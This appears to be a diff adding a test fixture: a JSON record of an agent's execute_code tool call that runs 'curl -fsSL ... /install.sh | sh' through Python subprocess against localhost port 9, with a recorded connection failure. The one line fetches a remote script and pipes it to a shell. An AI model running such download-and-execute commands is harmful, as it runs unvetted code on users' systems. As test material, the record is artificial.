@@ -1,0 +1,2 @@
+{"calls": [{"name": "execute_code", "args": "{\"code\": \"import subprocess\\nsubprocess.run('curl -fsSL http://127.0.0.1:9/install.sh | sh', shell=True)\"}",
+            "result_prefix": "curl: (7) Failed to connect to 127.0.0.1 port 9"}]}
